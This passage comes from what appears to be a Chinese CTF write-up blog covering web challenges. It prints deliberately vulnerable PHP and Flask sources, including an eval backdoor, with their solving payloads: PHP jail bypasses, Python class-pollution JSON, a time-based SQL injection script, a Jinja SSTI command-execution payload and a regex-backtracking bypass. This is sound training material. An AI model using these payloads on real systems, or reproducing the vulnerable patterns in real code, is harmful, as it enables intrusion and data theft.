chr($ascii);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;Flag: &quot; . $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;hint.html&quot;);</span><br><span class="line">$Jail = $_GET[&#x27;Jail_by.Happy&#x27;];</span><br><span class="line"></span><br><span class="line">if($Jail == null) die(&quot;Do You Like My Jail?&quot;);</span><br><span class="line"></span><br><span class="line">function Like_Jail($var) &#123;</span><br><span class="line">    if (preg_match(&#x27;/(`|\$|a|c|s|require|include)/i&#x27;, $var)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Like_Jail($Jail)) &#123;</span><br><span class="line">    eval($Jail);</span><br><span class="line">    echo &quot;Yes! you escaped from the jail! LOL!&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;You will Jail in your life!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">// 在HTML解析后再输出PHP源代码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to My Jail</span><br><span class="line">Do You Like My Jail?</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251203082719751.png" alt="image-20251203082719751"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php内置函数来进行绕过</span><br><span class="line">?Jail[by.Happy=highlight_file(implode(glob(&#x27;/f*&#x27;)));</span><br><span class="line">?Jail[by.Happy=highlight_file(glob(&#x27;/f*&#x27;)[0]);</span><br></pre></td></tr></table></figure><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><h4 id="圣钥之战1-0"><a href="#圣钥之战1-0" class="headerlink" title="圣钥之战1.0"></a>圣钥之战1.0</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">J1ngHong说：你想read flag吗？</span><br><span class="line">那么圣钥之光必将阻止你！</span><br><span class="line">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def hello_world():</span><br><span class="line">    return open(&#x27;/static/index.html&#x27;, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/read&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Read():</span><br><span class="line">    file = open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line">    return f&quot;J1ngHong说：你想read flag吗？</span><br><span class="line">那么圣钥之光必将阻止你！</span><br><span class="line">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="line">&#123;file&#125;</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Pollution():</span><br><span class="line">    if request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span><br><span class="line">    return &quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">污染/file</span><br><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;__file__&quot;:&quot;/flag&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">污染/static</span><br><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;app&quot;:&#123;</span><br><span class="line">                &quot;_static_folder&quot;:&quot;./&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="line">error_reporting(0);</span><br><span class="line">$J1ng = $_POST[&#x27;J&#x27;];</span><br><span class="line">$Hong = $_POST[&#x27;H&#x27;];</span><br><span class="line">$Keng = $_GET[&#x27;K&#x27;];</span><br><span class="line">$Wang = $_GET[&#x27;W&#x27;];</span><br><span class="line">$dir = new $Keng($Wang);</span><br><span class="line">foreach($dir as $f) &#123;</span><br><span class="line">    echo($f . &#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">echo new $J1ng($Hong);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的原生类读取</span><br><span class="line">?K=DirectoryIterator&amp;W=/secret/</span><br><span class="line">J=SplFileObject&amp;H=/secret/f11444g.php</span><br></pre></td></tr></table></figure><h4 id="No-JWT"><a href="#No-JWT" class="headerlink" title="No JWT"></a>No JWT</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import jwt</span><br><span class="line">import datetime</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 随机生成 secret_key</span><br><span class="line">app.secret_key = &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=16))</span><br><span class="line"></span><br><span class="line"># 登录接口</span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    data = request.json</span><br><span class="line">    username = data.get(&#x27;username&#x27;)</span><br><span class="line">    password = data.get(&#x27;password&#x27;)</span><br><span class="line"></span><br><span class="line">    # 其他用户都给予 user 权限</span><br><span class="line">    token = jwt.encode(&#123;</span><br><span class="line">            &#x27;sub&#x27;: username,</span><br><span class="line">            &#x27;role&#x27;: &#x27;user&#x27;,  # 普通用户角色</span><br><span class="line">            &#x27;exp&#x27;: datetime.datetime.utcnow() + datetime.timedelta(hours=1)</span><br><span class="line">        &#125;, app.secret_key, algorithm=&#x27;HS256&#x27;)</span><br><span class="line">    return jsonify(&#123;&#x27;token&#x27;: token&#125;), 200</span><br><span class="line"></span><br><span class="line"># flag 接口</span><br><span class="line">@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def flag():</span><br><span class="line">    token = request.headers.get(&#x27;Authorization&#x27;)</span><br><span class="line">    </span><br><span class="line">    if token:</span><br><span class="line">        try:</span><br><span class="line">            decoded = jwt.decode(token.split(&quot; &quot;)[1], options=&#123;&quot;verify_signature&quot;: False, &quot;verify_exp&quot;: False&#125;)</span><br><span class="line">            # 检查用户角色是否为 admin</span><br><span class="line">            if decoded.get(&#x27;role&#x27;) == &#x27;admin&#x27;:</span><br><span class="line">                with open(&#x27;/flag&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">                    flag_content = f.read()</span><br><span class="line">                return jsonify(&#123;&#x27;flag&#x27;: flag_content&#125;), 200</span><br><span class="line">            else:</span><br><span class="line">                return jsonify(&#123;&#x27;message&#x27;: &#x27;Access denied: admin only&#x27;&#125;), 403</span><br><span class="line">            </span><br><span class="line">        except FileNotFoundError:</span><br><span class="line">            return jsonify(&#123;&#x27;message&#x27;: &#x27;Flag file not found&#x27;&#125;), 404</span><br><span class="line">        except jwt.ExpiredSignatureError:</span><br><span class="line">            return jsonify(&#123;&#x27;message&#x27;: &#x27;Token has expired&#x27;&#125;), 401</span><br><span class="line">        except jwt.InvalidTokenError:</span><br><span class="line">            return jsonify(&#123;&#x27;message&#x27;: &#x27;Invalid token&#x27;&#125;), 401</span><br><span class="line">    return jsonify(&#123;&#x27;message&#x27;: &#x27;Token is missing&#x27;&#125;), 401</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251203090118326.png" alt="image-20251203090118326"></p><p><img src="/../images/image-20251203090526755.png" alt="image-20251203090526755"></p><p><img src="/../images/image-20251203090538309.png" alt="image-20251203090538309"></p><h4 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/select|;|@|\n/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//flag in ctf.flag</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query); 没有select，让你执行一句又如何 没有select，让你执行一句又如何</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入的语句被控制在数据库中，所以应该只可以进行sql注入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show tables</span><br><span class="line">show columns from flag</span><br><span class="line">delete from flag where data like &#x27;B%&#x27; and sleep(5)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">sqlstr = string.ascii_lowercase + string.digits + &#x27;-&#x27; + &quot;&#123;&#125;&quot;</span><br><span class="line">url = &quot;http://challenge.imxbt.cn:30507/?sql=delete%20from%20flag%20where%20data%20like%20%27&quot;</span><br><span class="line">end=&quot;%25%27%20and%20sleep(5)&quot;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    for c in sqlstr:</span><br><span class="line">        payload = url +flag+ c + end</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(payload,timeout=4)</span><br><span class="line">        except:</span><br><span class="line">            print(flag+c)</span><br><span class="line">            flag+=c</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h3 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h3><h4 id="Jinja-Mark"><a href="#Jinja-Mark" class="headerlink" title="Jinja Mark"></a>Jinja Mark</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原型链污染置空黑名单，进行ssti</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251203124315305.png" alt="image-20251203124315305"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line">@app.route(&#x27;/magic&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def pollute():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        if request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            return &quot;这个魔术还行吧&quot;</span><br><span class="line">        else:</span><br><span class="line">            return &quot;我要json的魔术&quot;</span><br><span class="line">    return &quot;记得用POST方法把魔术交上来&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;BLACKLIST_IN_index&quot;:&quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line"># 我记得她...好像叫flag.php吧？</span><br><span class="line">$emp=$_GET[&#x27;e_m.p&#x27;];</span><br><span class="line">$try=$_POST[&#x27;try&#x27;];</span><br><span class="line">if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)</span><br><span class="line">&#123;</span><br><span class="line">    for ($i=0;$i&lt;strlen($emp);$i++)&#123;</span><br><span class="line">        if (ctype_alpha($emp[$i]))&#123;</span><br><span class="line">            die(&quot;你不是hacker？那请去外场等候！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;只有真正的hacker才能拿到flag！&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    if (preg_match(&#x27;/.+?HACKER/is&#x27;,$try))&#123;</span><br><span class="line">        die(&quot;你是hacker还敢自报家门呢？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!stripos($try,&#x27;HACKER&#x27;) === TRUE)&#123;</span><br><span class="line">        die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a=$_GET[&#x27;a&#x27;];</span><br><span class="line">    $b=$_GET[&#x27;b&#x27;];</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(stripos($b,&#x27;php&#x27;)!==0)&#123;</span><br><span class="line">        die(&quot;收手吧hacker，你得不到flag的！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo (new $a($b))-&gt;$c();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;114514到底是啥意思嘞？。？&quot;);</span><br><span class="line">&#125;</span><br><span class="line"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span><br><span class="line">$shell=$_POST[&#x27;shell&#x27;];</span><br><span class="line">eval($shell);</span><br><span class="line">?&gt;</span><br><span class="line">114514到底是啥意思嘞？。？</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正则回溯绕过</span><br><span class="line">b要以php开头，用SplFileObject配合php伪协议</span><br><span class="line">c是toString方法打印结果</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://101.37.149.223:32943/index.php&quot;</span><br><span class="line">params = &#123;</span><br><span class="line">    &#x27;e[m.p&#x27;: &#x27;114514.1&#x27;,</span><br><span class="line">    &#x27;a&#x27;: &#x27;SplFileObject&#x27;, </span><br><span class="line">    &#x27;b&#x27;: &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;,</span><br><span class="line">    &#x27;c&#x27;: &#x27;__toString&#x27;</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;try&#x27;: &quot;-&quot; * 1000001 + &quot;HACKER&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, params=params, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h4 id="Lucky-Number"><a href="#Lucky-Number" class="headerlink" title="Lucky Number"></a>Lucky Number</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template_string,render_template</span><br><span class="line">from jinja2 import Template</span><br><span class="line">import json</span><br><span class="line">import heaven</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">BLACKLIST_IN_index = [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]</span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/m4G1c&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def pollute():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        if request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            result = heaven.create()</span><br><span class="line">            message = result[&quot;message&quot;]</span><br><span class="line">            return &quot;这个魔术还行吧</span><br><span class="line">&quot; + message</span><br><span class="line">        else:</span><br><span class="line">            return &quot;我要json的魔术&quot;</span><br><span class="line">    return &quot;记得用POST方法把魔术交上来&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#heaven.py</span><br><span class="line"></span><br><span class="line">def create(kon=&quot;Kon&quot;, pure=&quot;Pure&quot;, *, confirm=False):</span><br><span class="line">    if confirm and &quot;lucky_number&quot; not in create.__kwdefaults__:</span><br><span class="line">        return &#123;&quot;message&quot;: &quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;</span><br><span class="line">    if confirm and &quot;lucky_number&quot; in create.__kwdefaults__:</span><br><span class="line">        return &#123;&quot;message&quot;: &quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;, &quot;lucky_number&quot;: create.__kwdefaults__[&quot;lucky_number&quot;]&#125;</span><br><span class="line"></span><br><span class="line">    return &#123;&quot;message&quot;: &quot;你有什么想创造的吗？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原型链污染黑名单打ssti</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;heaven&quot;:&#123;</span><br><span class="line">                &quot;create&quot;:&#123;</span><br><span class="line">                    &quot;__kwdefaults__&quot;:&#123;</span><br><span class="line">                        